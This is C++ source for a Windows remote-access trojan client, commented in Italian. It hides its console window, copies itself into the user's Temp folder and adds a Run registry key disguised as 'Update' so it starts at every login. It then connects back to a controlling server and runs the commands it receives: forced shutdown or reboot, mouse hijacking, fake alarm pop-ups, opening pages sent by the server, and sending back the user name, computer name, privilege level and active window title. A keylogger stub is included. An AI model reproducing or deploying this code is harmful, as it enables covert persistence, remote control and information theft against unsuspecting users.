#include <iostream>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <thread>
#include <sstream>
#include <time.h>
#include <windows.h>
#include <fstream>

int v=0;
bool v2=true;
bool v3=true;
bool v4=true;
bool v5=true;
SOCKET Client;
addrinfo Server;
TCHAR name[30]={0};

using namespace std;

int initSock();
SOCKET createSock();
addrinfo getSinfo(SOCKET,int);
addrinfo wcon(SOCKET,addrinfo);
void ricevi(SOCKET);
void manda(SOCKET);
void MSGBOX();
void reg_write(LPCTSTR,LPCTSTR,DWORD,const char*);
bool preliminari();
void CMOUSE();
void BMOUSE();
void VMOUSE();
void GETINFO(SOCKET);
bool CheckPreliminari();
void InitKeylog();

///////////////////////////////////////////////////////////////MAIN

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	//if(CheckPreliminari())
		//if(preliminari())
			//return 0;
	preliminari();
	//InitKeylog();
	int PORTA=5555;//RIF
	int check=0;
	if(initSock()!=-1)
	{
		Client=createSock();
		if(Client!=0)
		{
			Server=getSinfo(Client,PORTA);
			if(Server.ai_family==-1)
				return 0;
		}
		else if(Client==0)
			return 0;
	}
	else if(initSock()==-1)
		return 0;
	
	Server=wcon(Client,Server);
	thread t1(ricevi,Client);
	thread t2(manda,Client);
	
	t1.detach();
	while(true)
	{
		if(v==-1)
			break;
	}
	
	closesocket(Client);
	WSACleanup();
	//system("pause");
	return 0;
}

///////////////////////////////////////////////////////////////FUNZIONI

int initSock()
{
	WSADATA WSAData;
	if(WSAStartup (MAKEWORD(2,2), &WSAData))
	{
		cout<<"Errore nell'inizializzazione delle socket..."<<endl;
		WSACleanup();
		return -1;
	}
	return 0;
}

SOCKET createSock()
{
	SOCKET s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		cout<<"Errore nella creazione del socket... "<<WSAGetLastError()<<endl;
		closesocket(s);
		WSACleanup();
		return 0;
	}
	return s;
}

addrinfo getSinfo(SOCKET s,int p)
{
	addrinfo *ainfo;
	if (getaddrinfo("127.0.0.1", NULL, NULL, &ainfo))
	{
		cout<<"Errore: impossibile risolvere l'indirizzo..."<<endl;
		closesocket(s);
		WSACleanup();
		ainfo->ai_family=-1;
		return *ainfo;
	}
	((sockaddr_in *)(ainfo->ai_addr))->sin_port = htons (p);
	return *ainfo;
}

addrinfo wcon(SOCKET s,addrinfo a)
{
	char sig[30]="cripe";
	DWORD cchCN=30;
	cout<<"<Client> Tento di connettermi al Server..."<<endl;
	while(true)
	{
		Sleep(1000);
		if(connect(s,(sockaddr *)(a.ai_addr),sizeof(sockaddr_in)))
		{
			freeaddrinfo(a.ai_next);
			cout<<"<Client> Errore: impossibile connettersi, riprovo..."<<endl;
		}
		else
		{
			cout<<"<Client> Connesso con il Server!\n"<<endl;
			Sleep(10);
			send(s,sig,30,0);
			GetUserName(name,&cchCN);
			send(s,name,30,0);
			break;
		}
	}
	freeaddrinfo(a.ai_next);
	return a;
}

void ricevi(SOCKET s)
{
	int ck=0;
	char msg=0;
	while(true)
	{
		ck=recv(s,&msg,sizeof(msg),0);
		if(msg!=0 && ck!=-1)
		{
			if(msg=='A')
			{
				cout<<"\n<Client> Il Server ha chiuso la connessione...";
				//Sleep(10);
				closesocket(s);
				v=-1;
				return;
			}
			if(v==-1)
				return;
			if(msg=='B')
			{
				system("shutdown -s -t 1 -f");
				cout<<"<Server> Shutdown."<<endl;
			}
			if(msg=='E')
			{
				system("shutdown -r -t 1 -f");
				cout<<"<Server> Reboot."<<endl;
			}
			if(msg=='C')
			{
				SwapMouseButton(true);
				cout<<"<Server> Mouse swap."<<endl;
			}
			if(msg=='D')
			{
				SwapMouseButton(false);
				cout<<"<Server> Mouse unswap."<<endl;
			}
			if(msg=='F')
			{
				mciSendString("set cdaudio door open",NULL,0,NULL);
				cout<<"<Server> Open CD."<<endl;
			}
			if(msg=='G')
			{
				mciSendString("set cdaudio door closed",NULL,0,NULL);
				cout<<"<Server> Close CD."<<endl;
			}
			if(msg=='H')
			{
				SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
				cout<<"<Server> Monitor off."<<endl;
			}
			if(msg=='I')
			{
				thread t3(MSGBOX);
				t3.detach();
				cout<<"<Server> Msgbox."<<endl;
			}
			if(msg=='J')
			{
				cout<<"<Server> Client reset."<<endl;
				system("start Client.exe");
				closesocket(s);
				v=-1;
				return;
			}
			if(msg=='K')
			{
				thread t4(CMOUSE);
				t4.detach();
				cout<<"<Server> CrazyMouse."<<endl;
			}
			if(msg=='L')
			{
				v2=false;
				cout<<"<Server> CrazyMouse stop."<<endl;
			}
			if(msg=='M')
			{
				thread t4(BMOUSE);
				t4.detach();
				cout<<"<Server> BlockMouse."<<endl;
			}
			if(msg=='N')
			{
				v3=false;
				cout<<"<Server> UnlockMouse."<<endl;
			}
			if(msg=='O')
			{
				thread t5(VMOUSE);
				t5.detach();
				cout<<"<Server> MouseViber."<<endl;
			}
			if(msg=='P')
			{
				v4=false;
				cout<<"<Server> MouseUnviber."<<endl;
			}
			if(msg=='Q')
			{
				v5=false;
				cout<<"<Server> GetInfo."<<endl;
				//char npc[256]={0}; // nome pc
				//char nut[256]={0}; // nome utente
				//char dir[260]={0}; // directory corrente del Client
				//char ver[50]={0};  // versione del Client
				//char uac='f';    // se il Client ha l'UAC
				//char awin[50]={0}; // la finestra attualmente attiva di windows
				GETINFO(s);
				v5=true;
			}
			if(msg=='R')
			{
				ShowWindow(GetConsoleWindow(), SW_SHOWNORMAL);
				cout<<"<Server> Client show."<<endl;
			}
			if(msg=='S')
			{
				ShowWindow(GetConsoleWindow(), SW_HIDE);
				cout<<"<Server> Client hide."<<endl;
			}
			if(msg=='T')
			{
				char web[100]={0};
				recv(s,web,sizeof(web),0);
				if(web[0]!='h' || web[1]!='t' || web[2]!='t' || web[3]!='p')
				{
					char final[100]="http://";
					for(int i=0;i<100-7;i++)
					{
						final[i+7]=web[i];
						web[i]=final[i];
					}
				}
				cout<<"<Server> Open web page "<<web<<endl;
				ShellExecute(NULL,"open",web,NULL,NULL,SW_SHOWNORMAL);
			}
		}
		else
			Sleep(5000);
	}
	return;
}

void manda(SOCKET s)
{
	char msg;
	while(true)
	{
		Sleep(5000);
		if(v5)
		if(send(s,&msg,sizeof(msg),0)==-1)
		{
			closesocket(Client);
			Client=createSock();
			Server=wcon(Client,Server);
		}
	}
}

void MSGBOX()
{
	srand(time(0));
	int r=rand()%5;
	
	switch(r)
	{
		case 0:
			MessageBox(NULL, "----ATTENZIONE!----\n\nIl tuo PC sta per esplodere!\nAllontanati subito entro 5 secondi", "Esplosione Imminente", MB_ICONWARNING | MB_OK);
		break;
		
		case 1:
			MessageBox(NULL, "Sei sicuro di voler cancellare \"System32\" DEFINITIVAMENTE?", "System32", MB_ICONWARNING | MB_MISCMASK);
		break;
		
		case 2:
			MessageBox(NULL, "Dio è morto e tu lo hai ucciso...", "Gesù", MB_USERICON | MB_ABORTRETRYIGNORE);
		break;
		
		case 3:
			MessageBox(NULL, "Un virus è stato rilevato nel tuo sistema!\n\nVuoi rimuoverlo?", "AntiVirus", MB_ICONSTOP | MB_YESNOCANCEL);
		break;
		
		case 4:
			MessageBox(NULL, "49 6c 20 67 69 6f 72 6e 6f 20 66 75 20 70 69 65 6e 6f 20 64 69 20 6c 61 6d 70 69 3b 0a 6d 61 20 6f 72 61 20 76 65 72 72 61 6e 6e 6f 20 6c 65 20 73 74 65 6c 6c 65 2c 0a 6c 65 20 74 61 63 69 74 65 20 73 74 65 6c 6c 65 2e 20 4e 65 69 20 63 61 6d 70 69 0a 63 27 65 20 75 6e 20 62 72 65 76 65 20 67 72 65 20 67 72 65 20 64 69 20 72 61 6e 65 6c 6c 65 2e 0a 4c 65 20 74 72 65 6d 75 6c 65 20 66 6f 67 6c 69 65 20 64 65 69 20 70 69 6f 70 70 69 0a 74 72 61 73 63 6f 72 72 65 20 75 6e 61 20 67 69 6f 69 61 20 6c 65 67 67 69 65 72 61 2e 0a 4e 65 6c 20 67 69 6f 72 6e 6f 2c 20 63 68 65 20 6c 61 6d 70 69 21 20 63 68 65 20 73 63 6f 70 70 69 21 0a 43 68 65 20 70 61 63 65 2c 20 6c 61 20 73 65 72 61 21 0a 0a 53 69 20 64 65 76 6f 6e 6f 20 61 70 72 69 72 65 20 6c 65 20 73 74 65 6c 6c 65 0a 6e 65 6c 20 63 69 65 6c 6f 20 73 69 20 74 65 6e 65 72 6f 20 65 20 76 69 76 6f 2e 0a 4c 61 2c 20 70 72 65 73 73 6f 20 6c 65 20 61 6c 6c 65 67 72 65 20 72 61 6e 65 6c 6c 65 2c 0a 73 69 6e 67 68 69 6f 7a 7a 61 20 6d 6f 6e 6f 74 6f 6e 6f 20 75 6e 20 72 69 76 6f 2e 0a 44 69 20 74 75 74 74 6f 20 71 75 65 6c 20 63 75 70 6f 20 74 75 6d 75 6c 74 6f 2c 0a 64 69 20 74 75 74 74 61 20 71 75 65 6c 6c 27 61 73 70 72 61 20 62 75 66 65 72 61 2c 0a 6e 6f 6e 20 72 65 73 74 61 20 63 68 65 20 75 6e 20 64 6f 6c 63 65 20 73 69 6e 67 75 6c 74 6f 0a 6e 65 6c 6c 27 75 6d 69 64 61 20 73 65 72 61 2e 0a 0a 45 2c 20 71 75 65 6c 6c 61 20 69 6e 66 69 6e 69 74 61 20 74 65 6d 70 65 73 74 61 2c 0a 66 69 6e 69 74 61 20 69 6e 20 75 6e 20 72 69 76 6f 20 63 61 6e 6f 72 6f 2e 0a 44 65 69 20 66 75 6c 6d 69 6e 69 20 66 72 61 67 69 6c 69 20 72 65 73 74 61 6e 6f 0a 63 69 72 72 69 20 64 69 20 70 6f 72 70 6f 72 61 20 65 20 64 27 6f 72 6f 2e 0a 0a 4f 20 73 74 61 6e 63 6f 20 64 6f 6c 6f 72 65 2c 20 72 69 70 6f 73 61 21 0a 4c 61 20 6e 75 62 65 20 6e 65 6c 20 67 69 6f 72 6e 6f 20 70 69 75 20 6e 65 72 61 0a 66 75 20 71 75 65 6c 6c 61 20 63 68 65 20 76 65 64 6f 20 70 69 75 20 72 6f 73 61 0a 6e 65 6c 6c 27 75 6c 74 69 6d 61 20 73 65 72 61 2e 0a 0a 43 68 65 20 76 6f 6c 69 20 64 69 20 72 6f 6e 64 69 6e 69 20 69 6e 74 6f 72 6e 6f 21 0a 63 68 65 20 67 72 69 64 69 20 6e 65 6c 6c 27 61 72 69 61 20 73 65 72 65 6e 61 21 0a 4c 61 20 66 61 6d 65 20 64 65 6c 20 70 6f 76 65 72 6f 20 67 69 6f 72 6e 6f 0a 70 72 6f 6c 75 6e 67 61 20 6c 61 20 67 61 72 72 75 6c 61 20 63 65 6e 61 2e 0a 4c 61 20 70 61 72 74 65 2c 20 73 69 20 70 69 63 63 6f 6c 61 2c 20 69 20 6e 69 64 69 0a 6e 65 6c 20 67 69 6f 72 6e 6f 20 6e 6f 6e 20 6c 27 65 62 62 65 72 6f 20 69 6e 74 65 72 61 2e 0a 4e 65 20 69 6f 2e 2e 2e 20 65 20 63 68 65 20 76 6f 6c 69 2c 20 63 68 65 20 67 72 69 64 69 2c 0a 6d 69 61 20 6c 69 6d 70 69 64 61 20 73 65 72 61 21 0a 0a 44 6f 6e 2e 2e 2e 20 44 6f 6e 2e 2e 2e 20 45 20 6d 69 20 64 69 63 6f 6e 6f 2c 20 44 6f 72 6d 69 21 0a 6d 69 20 63 61 6e 74 61 6e 6f 2c 20 44 6f 72 6d 69 21 20 73 75 73 73 75 72 72 61 6e 6f 2c 0a 44 6f 72 6d 69 21 20 62 69 73 62 69 67 6c 69 61 6e 6f 2c 20 44 6f 72 6d 69 21 0a 6c 61 2c 20 76 6f 63 69 20 64 69 20 74 65 6e 65 62 72 61 20 61 7a 7a 75 72 72 61 2e 2e 2e 0a 4d 69 20 73 65 6d 62 72 61 6e 6f 20 63 61 6e 74 69 20 64 69 20 63 75 6c 6c 61 2c 0a 63 68 65 20 66 61 6e 6e 6f 20 63 68 27 69 6f 20 74 6f 72 6e 69 20 63 6f 6d 27 65 72 61 2e 2e 2e 0a 73 65 6e 74 69 76 6f 20 6d 69 61 20 6d 61 64 72 65 2e 2e 2e 20 70 6f 69 20 6e 75 6c 6c 61 2e 2e 2e 0a 73 75 6c 20 66 61 72 20 64 65 6c 6c 61 20 73 65 72 61 2e", "...", MB_USERICON | MB_OK);
		break;
	}
	
	return;
}

void reg_write(LPCTSTR subkey,LPCTSTR name,DWORD type,const char* value)
{
	HKEY key;
	RegOpenKey(HKEY_CURRENT_USER,subkey,&key);
	RegSetValueEx(key,name,0,type,(LPBYTE)value,strlen(value)*sizeof(char));
	RegCloseKey(key);
	return;
}

bool preliminari()
{
	char buffer[MAX_PATH];
	GetModuleFileName( NULL, buffer, MAX_PATH );
	TCHAR szComputerName[256];
	DWORD cchComputerName = 256;
	char n[256]={'\0'};
	char p1[256]="\"C:\\Users\\";
	char p2[256]="\\AppData\\Local\\Temp\\test.exe\"";//2RIF
	char pF[256]={'\0'};
	char pFN[256]={'\0'};
	char cmd[256]={"start "};
	int c1=0;
	int c2=0;
	
	GetUserName(szComputerName, &cchComputerName);
	for(int i=0;i<256;i++)
	{
		if(szComputerName[i]!='\0')
			n[i]=szComputerName[i];
		else
			i=256;
	}
	for(int i=0;i<100;i++)
	{
		pF[i]=p1[i];
		pFN[i]=p1[i+1];
		if(n[i]!='\0')
			c1++;
	}
	for(int i=10;i<10+c1;i++)
		if(i>c1)
		{
			pF[i]=n[i-10];
			pFN[i-1]=n[i-10];
		}
	for(int i=10+c1;i<255;i++)
		if(p2[c2]!='\0')
		{
			pF[i]=p2[c2];
			if(c2!=0)
				pFN[i-2]=p2[c2-1];
			c2++;
		}
	
	CopyFile(buffer,pFN,true);
	reg_write("Software\\Microsoft\\Windows\\CurrentVersion\\Run","Update",REG_SZ,pF);
	
	for(int i=6;i<256;i++)
		cmd[i]=pFN[i-6];
	
	//system(cmd);
	
	return true;
}

void CMOUSE()
{
	srand(time(0));
	for(v2=true;v2;)
	{
		SetCursorPos(rand()%1920,rand()%1080);
		Sleep(10);
	}
	return;
}

void BMOUSE()
{
	POINT coor;
	GetCursorPos(&coor);
	for(v3=true;v3;)
	{
		SetCursorPos(coor.x,coor.y);
	}
	return;
}

void VMOUSE()
{
	srand(time(0));
	POINT coor;
	for(v4=true;v4;)
	{
		GetCursorPos(&coor);
		switch(rand()%4)
		{
			case 0:
				SetCursorPos(coor.x+rand()%5,coor.y+rand()%5);
				Sleep(10);
			break;
			
			case 1:
				SetCursorPos(coor.x+rand()%5,coor.y-rand()%5);
				Sleep(10);
			break;
			
			case 2:
				SetCursorPos(coor.x-rand()%5,coor.y+rand()%5);
				Sleep(10);
			break;
			
			case 3:
				SetCursorPos(coor.x-rand()%5,coor.y-rand()%5);
				Sleep(10);
			break;
		}
	}
	return;
}

void GETINFO(SOCKET s)
{
	TCHAR szCN[256];
	DWORD cchCN=256;
	char buff[MAX_PATH];
	bool fRet=false;
    HANDLE hToken=NULL;
    char wnd_title[256];
    char uac='f';
	
	Sleep(50);
	
	GetComputerName(szCN,&cchCN);
	//send(s,&uac,sizeof(uac),0);
	send(s,szCN,sizeof(szCN),0);
	
	GetUserName(szCN,&cchCN);
	send(s,szCN,sizeof(szCN),0);
	
	GetModuleFileName(NULL,buff,MAX_PATH);
	send(s,buff,sizeof(buff),0);
	
	char ver[50]="1.0.3";
	send(s,ver,sizeof(ver),0);
	
	if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
	{
        TOKEN_ELEVATION Elevation;
        DWORD cbSize=sizeof(TOKEN_ELEVATION);
        if(GetTokenInformation(hToken,TokenElevation,&Elevation,sizeof(Elevation),&cbSize))
            fRet=Elevation.TokenIsElevated;
    }
    if(hToken)
        CloseHandle(hToken);
    if(fRet)
    	uac='t';
    else
    	uac='f';
    send(s,&uac,sizeof(uac),0);
    
    HWND hwnd=GetForegroundWindow();
    GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
    send(s,wnd_title,sizeof(wnd_title),0);
	
	return;
}

bool CheckPreliminari()
{
	char buffer[MAX_PATH];
	GetModuleFileName( NULL, buffer, MAX_PATH );
	
	for(int i=0;i<MAX_PATH;i++)
	{
		if(buffer[i]=='T')
			if(buffer[i+1]=='e')
				if(buffer[i+2]=='m')
					if(buffer[i+3]=='p')
						return false;
	}
	
	return true;
}

void InitKeylog()
{
	int quanti=0;
	string logs[365];
	string logsN[365];
	
	ifstream infile;
	ofstream outfile;
	
	infile.open("prova.log");
	infile>>quanti;
	for(int i=0;i<quanti;i++)
		infile>>logsN[i];
	infile.close();
	
	if(quanti==0)
	{
		cout<<"eccomi"<<endl;
		outfile.open("prova.log");
		outfile<<"1 ";
		
		time_t     now = time(0);
	    struct tm  tstruct;
	    char       buf[80];
	    tstruct = *localtime(&now);
	    strftime(buf, sizeof(buf), "%Y-%m-%d.log", &tstruct);
	    
	    outfile<<buf;
    
		outfile.close();
	}
	
	return;
}
